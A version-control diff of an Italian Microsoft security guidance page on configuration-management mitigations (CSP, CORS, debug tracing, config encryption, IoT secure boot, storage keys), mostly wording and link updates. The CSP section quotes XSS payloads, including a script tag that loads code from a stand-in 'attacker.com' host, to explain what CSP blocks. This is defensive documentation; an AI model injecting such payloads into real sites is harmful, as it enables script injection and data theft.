@@ -14,14 +14,14 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: fe6251f70ae62440bbbefc8c3aa5d92d934d8ba0
-ms.sourcegitcommit: da3459aca32dcdbf6a63ae9186d2ad2ca2295893
+ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
+ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
 ms.translationtype: HT
 ms.contentlocale: it-IT
-ms.lasthandoff: 11/07/2018
-ms.locfileid: "51249354"
+ms.lasthandoff: 12/04/2018
+ms.locfileid: "52849769"
 ---
-# <a name="security-frame-configuration-management--mitigations"></a>Infrastruttura di sicurezza: gestione della configurazione - Procedure di mitigazione 
+# <a name="security-frame-configuration-management--mitigations"></a>Infrastruttura di sicurezza: Gestione della configurazione - Procedure di mitigazione 
 | Prodotto o servizio | Articolo |
 | --------------- | ------- |
 | **Applicazione Web** | <ul><li>[Implementare Content Security Policy (CSP) e disabilitare il contenuto JavaScript inline](#csp-js)</li><li>[Abilitare il filtro XSS del browser](#xss-filter)</li><li>[Le applicazioni ASP.NET devono disabilitare la traccia e il debug prima della distribuzione](#trace-deploy)</li><li>[Accedere a contenuto JavaScript di terze parti solo da origini attendibili](#js-trusted)</li><li>[Assicurarsi che le pagine ASP.NET autenticate incorporino difese contro attacchi di tipo UI redress o click-jacking](#ui-defenses)</li><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato nelle applicazioni Web ASP.NET](#cors-aspnet)</li><li>[Abilitare l'attributo ValidateRequest nelle pagine ASP.NET](#validate-aspnet)</li><li>[Usare le versioni più recenti ospitate in locale delle librerie JavaScript](#local-js)</li><li>[Disabilitare l'analisi MIME automatica](#mime-sniff)</li><li>[Rimuovere le intestazioni del server standard nei siti Web di Microsoft Azure per evitare la creazione di impronte digitali](#standard-finger)</li></ul> |
@@ -43,7 +43,7 @@ ms.locfileid: "51249354"
 | **Tecnologie applicabili** | Generico |
 | **Attributes (Attributi) (Attributi)**              | N/D  |
 | **Riferimenti**              | [An Introduction to Content Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Introduzione a Content Security Policy) [Content Security Policy Reference](http://content-security-policy.com/) (Informazioni di riferimento su Content Security Policy), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Funzionalità di sicurezza), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Introduzione a Content Security Policy), [(È possibile usare use CSP?)](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **Passaggi** | <p>Content Security Policy (CSP) è un meccanismo di sicurezza avanzato, uno standard W3C, che consente ai proprietari di applicazioni Web di avere il controllo del contenuto incorporato nel sito. CSP viene aggiunto come intestazione della risposta HTTP nel server Web e viene applicato sul lato client dai browser. Si tratta di criteri basati su un elenco di elementi consentiti: un sito Web può dichiarare un set di domini attendibili da cui possono essere caricati contenuti attivi, ad esempio JavaScript.</p><p>CSP offre i seguenti vantaggi per la sicurezza:</p><ul><li>**Protezione da XSS:** se una pagina è vulnerabile a XSS, un utente malintenzionato può sfruttarlo in 2 modi:<ul><li>Inserimento di `<script>malicious code</script>`. Questo exploit non funzionerà a causa della restrizione di base 1 di CSP.</li><li>Inserimento di `<script src=”http://attacker.com/maliciousCode.js”/>`. Questo exploit non funzionerà perché il dominio controllato dall'utente malintenzionato non sarà nell'elenco di domini consentiti di CSP.</li></ul></li><li>**Controllo sull'esfiltrazione dei dati:** se un contenuto dannoso in una pagina Web prova a connettersi a un sito Web esterno e a sottrarre dati, la connessione verrà interrotta da CSP. Infatti il dominio di destinazione non sarà nell'elenco elementi consentiti di CSP.</li><li>**Difesa contro il click-jacking:** il click-jacking è una tecnica di attacco con la quale un antagonista può inserire in un frame un sito Web originale e forzare gli utenti a fare clic sugli elementi dell'interfaccia utente. Attualmente la difesa contro il click-jacking si basa sulla configurazione dell'intestazione della risposta X-Frame-Options. Non tutti i browser supportano questa intestazione e, con il passare del tempo, CSP diventerà uno dei modi standard per difendersi dal click-jacking</li><li>**Creazione di report sugli attacchi in tempo reale:** se si verifica un attacco di tipo injection in un sito Web abilitato per CSP, i browser attiveranno automaticamente una notifica per un endpoint configurato sul server Web. In questo modo, CSP funge da sistema di avviso in tempo reale.</li></ul> |
+| **Passaggi** | <p>Content Security Policy (CSP) è un meccanismo di sicurezza avanzato, uno standard W3C, che consente ai proprietari di applicazioni Web di avere il controllo del contenuto incorporato nel sito. CSP viene aggiunto come intestazione della risposta HTTP nel server Web e viene applicato sul lato client dai browser. Si tratta di criteri basati su un elenco di elementi consentiti: un sito Web può dichiarare un set di domini attendibili da cui possono essere caricati contenuti attivi, ad esempio JavaScript.</p><p>CSP offre i seguenti vantaggi per la sicurezza:</p><ul><li>**Protezione da XSS:** Se una pagina è vulnerabile a XSS, un utente malintenzionato può sfruttarlo in 2 modi:<ul><li>Inserimento di `<script>malicious code</script>`. Questo exploit non funzionerà a causa della restrizione di base 1 di CSP.</li><li>Inserimento di `<script src=”http://attacker.com/maliciousCode.js”/>`. Questo exploit non funzionerà perché il dominio controllato dall'utente malintenzionato non sarà nell'elenco di domini consentiti di CSP.</li></ul></li><li>**Controllo sull'esfiltrazione dei dati:** Se un contenuto dannoso in una pagina Web prova a connettersi a un sito Web esterno e a sottrarre dati, la connessione verrà interrotta da CSP. Infatti il dominio di destinazione non sarà nell'elenco elementi consentiti di CSP.</li><li>**Difesa contro il click-jacking:** il click-jacking è una tecnica di attacco con la quale un antagonista può inserire in un frame un sito Web originale e forzare gli utenti a fare clic sugli elementi dell'interfaccia utente. Attualmente la difesa contro il click-jacking si basa sulla configurazione dell'intestazione della risposta X-Frame-Options. Non tutti i browser supportano questa intestazione e, con il passare del tempo, CSP diventerà uno dei modi standard per difendersi dal click-jacking</li><li>**Creazione di report sugli attacchi in tempo reale:** Se si verifica un attacco di tipo injection in un sito Web abilitato per CSP, i browser attiveranno automaticamente una notifica per un endpoint configurato sul server Web. In questo modo, CSP funge da sistema di avviso in tempo reale.</li></ul> |
 
 ### <a name="example"></a>Esempio
 Criteri di esempio: 
@@ -85,7 +85,7 @@ Example: var str="alert(1)"; eval(str);
 | **Fase SDL**               | Compilare |  
 | **Tecnologie applicabili** | Generico |
 | **Attributes (Attributi) (Attributi)**              | N/D  |
-| **Riferimenti**              | [Panoramica del debug di ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Panoramica dell'analisi di ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Procedura: Abilitare l'analisi per un'applicazione ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [Procedura: Abilitare il debug per applicazioni ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Riferimenti**              | [Panoramica sul debug di ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Panoramica sull'analisi di ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Informazioni su come: Abilitare l’analisi per un'applicazione ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [Informazioni su come: Abilitare il debug per applicazioni ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **Passaggi** | Quando l'analisi viene abilitata per la pagina, ogni browser che la richiede ottiene anche le informazioni di analisi contenenti i dati sul flusso di lavoro e sullo stato del server interno. Tali informazioni possono essere relative alla sicurezza. Quando il debug viene abilitato per la pagina, gli errori che si verificano sul server restituiscono dati di analisi dello stack completa presentati al browser. Tali dati possono esporre informazioni relative alla sicurezza sul flusso di lavoro del server. |
 
 ## <a id="js-trusted"></a>Accedere a contenuto JavaScript di terze parti solo da origini attendibili
@@ -210,7 +210,7 @@ Si noti che la funzionalità di convalida della richiesta non è supportata e no
 | **Fase SDL**               | Compilare |  
 | **Tecnologie applicabili** | Generico |
 | **Attributes (Attributi) (Attributi)**              | N/D  |
-| **Riferimenti**              | [IE8 Security Part V: Comprehensive Protection](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) (Sicurezza di IE8 parte V: protezione completa), [MIME type](http://en.wikipedia.org/wiki/Mime_type) (Tipo MIME) |
+| **Riferimenti**              | [Sicurezza di IE8 parte V: Protezione completa](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [Tipo MIME](http://en.wikipedia.org/wiki/Mime_type) |
 | **Passaggi** | L'intestazione X-Content-Type-Options è un'intestazione HTTP che consente agli sviluppatori di specificare che il contenuto non deve essere sottoposto ad analisi MIME. Questa intestazione è progettata per mitigare gli attacchi basati sull'analisi MIME. Per ogni pagina che potrebbe includere contenuti controllabili dall'utente, è necessario usare l'intestazione HTTP X-Content-Type-Options:nosniff. Per abilitare l'intestazione necessaria a livello globale per tutte le pagine nell'applicazione, eseguire una di queste operazioni.|
 
 ### <a name="example"></a>Esempio
@@ -396,7 +396,7 @@ public class ResourcesController : ApiController
 | **Riferimenti**              | [Enabling Cross-Origin Requests (CORS) in ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) (Abilitazione di richieste multiorigine (CORS) in ASP.NET Core 1.0) |
 | **Passaggi** | <p>In ASP.NET Core 1.0 CORS può essere abilitato usando il middleware o MVC. Quando si usa MVC per abilitare CORS, vengono usati gli stessi servizi CORS, ma non il middleware CORS.</p>|
 
-**Approccio 1** Abilitazione di CORS con il middleware: per abilitare CORS per l'intera applicazione, aggiungere il middleware CORS alla pipeline di richieste usando il metodo di estensione UseCors. Si possono specificare criteri multiorigine quando si aggiunge il middleware CORS usando la classe CorsPolicyBuilder. A questo scopo è possibile procedere in due modi:
+**Approccio 1** Abilitazione di CORS con il middleware: Per abilitare CORS per l'intera applicazione, aggiungere il middleware CORS alla pipeline di richieste usando il metodo di estensione UseCors. Si possono specificare criteri multiorigine quando si aggiunge il middleware CORS usando la classe CorsPolicyBuilder. A questo scopo è possibile procedere in due modi:
 
 ### <a name="example"></a>Esempio
 Il primo consiste nel chiamare UseCors con un operatore lambda. L'operatore lambda accetta un oggetto CorsPolicyBuilder: 
@@ -431,10 +431,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Approccio 2** Abilitazione di CORS in MVC: in alternativa gli sviluppatori possono usare MVC per applicare CORS specifici per azione, per controller o a livello globale per tutti i controller.
+**Approccio 2** Abilitazione di CORS in MVC: In alternativa gli sviluppatori possono usare MVC per applicare CORS specifici per azione, per controller o a livello globale per tutti i controller.
 
 ### <a name="example"></a>Esempio
-Per azione: per specificare un criterio CORS per un'azione specifica, aggiungere l'attributo [EnableCors] all'azione. Specificare il nome del criterio. 
+Per azione: Per specificare un criterio CORS per un'azione specifica, aggiungere l'attributo [EnableCors] all'azione. Specificare il nome del criterio. 
 ```csharp
 public class HomeController : Controller
 {
@@ -485,7 +485,7 @@ Per disabilitare CORS per un controller o un'azione, usare l'attributo [DisableC
 | **Fase SDL**               | Distribuzione |  
 | **Tecnologie applicabili** | Generico |
 | **Attributes (Attributi) (Attributi)**              | N/D  |
-| **Riferimenti**              | [How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI](https://msdn.microsoft.com/library/ff647398.aspx) (Procedura: Crittografare le sezioni di configurazione in ASP.NET 2.0 usando DPAPI), [Specifica di un provider di configurazione protetta](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Using Azure Key Vault to protect application secrets](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) (Uso di Azure Key Vault per proteggere i segreti dell'applicazione) |
+| **Riferimenti**              | [Procedure: Crittografare le sezioni di configurazione in ASP.NET 2.0 usando DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [Specifica di un provider di configurazione protetta](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Uso di Azure Key Vault per proteggere i segreti dell'applicazione](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
 | **Passaggi** | I file di configurazione, ad esempio Web.config e appsettings.json, vengono spesso usati per memorizzare informazioni sensibili, inclusi nomi utente, password, stringhe di connessione del database e chiavi di crittografia. Se non si proteggono queste informazioni, l'applicazione è vulnerabile agli utenti malintenzionati che ottengono informazioni sensibili, ad esempio nomi account utente e password, nomi dei database e nomi dei server. In base al tipo di distribuzione (Azure/locale), crittografare le sezioni sensibili dei file config usando DPAPI o servizi come Azure Key Vault. |
 
 ## <a id="admin-strong"></a>Assicurarsi che tutte le interfacce amministrative siano protette con credenziali sicure
@@ -507,7 +507,7 @@ Per disabilitare CORS per un controller o un'azione, usare l'attributo [DisableC
 | **Fase SDL**               | Compilare |  
 | **Tecnologie applicabili** | Generico |
 | **Attributes (Attributi) (Attributi)**              | N/D  |
-| **Riferimenti**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) (Abilitazione dell'avvio protetto e della crittografia dispositivo BitLocker in Windows 10 IoT Core) |
+| **Riferimenti**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) (Abilitazione dell'avvio protetto e della crittografia dispositivo BitLocker in Windows 10 IoT Core) |
 | **Passaggi** | L'avvio protetto UEFI limita il sistema consentendo solo l'esecuzione di file binari firmati da un'autorità specificata. Questa funzionalità impedisce l'esecuzione di codice sconosciuto sulla piattaforma e il potenziale indebolimento del comportamento di sicurezza. Abilitare l'avvio protetto UEFI e limitare l'elenco di autorità di certificazione considerate attendibili per la firma del codice. Firmare tutto il codice distribuito nel dispositivo usando una delle autorità attendibili. |
 
 ## <a id="partition-iot"></a>Crittografare il sistema operativo e altre partizioni del dispositivo IoT con bit-locker
@@ -585,7 +585,7 @@ Per disabilitare CORS per un controller o un'azione, usare l'attributo [DisableC
 | **Tecnologie applicabili** | Generico |
 | **Attributes (Attributi) (Attributi)**              | N/D  |
 | **Riferimenti**              | [Guida alla sicurezza di Archiviazione di Azure: gestione delle chiavi dell'account di archiviazione](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
-| **Passaggi** | <p>Archiviazione chiavi: è consigliabile archiviare le chiavi di accesso alle risorse di archiviazione di Azure in Azure Key Vault come segreto e fare in modo che le applicazioni recuperino la chiave dall'insieme di credenziali delle chiavi. È consigliabile per i motivi seguenti:</p><ul><li>L'applicazione non avrà mai una chiave di archiviazione hardcoded in un file di configurazione, eliminando la possibilità che qualcuno possa ottenere l'accesso alle chiavi senza un'autorizzazione specifica.</li><li>L'accesso alle chiavi può essere controllato con Azure Active Directory. Il proprietario dell'account può quindi concedere l'accesso solo alle applicazioni che devono recuperare le chiavi da Azure Key Vault. Le altre applicazioni non riusciranno ad accedere alle chiavi se non vengono loro concesse autorizzazioni specifiche.</li><li>Rigenerazione delle chiavi: è consigliabile avere un processo attivo per rigenerare le chiavi di accesso alle risorse di archiviazione di Azure per motivi di sicurezza. I dettagli su perché e come pianificare la rigenerazione delle chiavi sono documentati nell'articolo di riferimento Guida alla sicurezza di Archiviazione di Azure.</li></ul>|
+| **Passaggi** | <p>Archiviazione chiavi: Si consiglia di archiviare le chiavi di accesso alle risorse di archiviazione di Azure in Azure Key Vault come segreto e fare in modo che le applicazioni recuperino la chiave dall'insieme di credenziali delle chiavi. È consigliabile per i motivi seguenti:</p><ul><li>L'applicazione non avrà mai una chiave di archiviazione hardcoded in un file di configurazione, eliminando la possibilità che qualcuno possa ottenere l'accesso alle chiavi senza un'autorizzazione specifica.</li><li>L'accesso alle chiavi può essere controllato con Azure Active Directory. Il proprietario dell'account può quindi concedere l'accesso solo alle applicazioni che devono recuperare le chiavi da Azure Key Vault. Le altre applicazioni non riusciranno ad accedere alle chiavi se non vengono loro concesse autorizzazioni specifiche.</li><li>Rigenerazione delle chiavi: Si consiglia di predisporre un processo per rigenerare le chiavi di accesso alle risorse di archiviazione di Azure per motivi di sicurezza. I dettagli su perché e come pianificare la rigenerazione delle chiavi sono documentati nell'articolo di riferimento Guida alla sicurezza di Archiviazione di Azure.</li></ul>|
 
 ## <a id="cors-storage"></a>Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato in Archiviazione di Azure
 
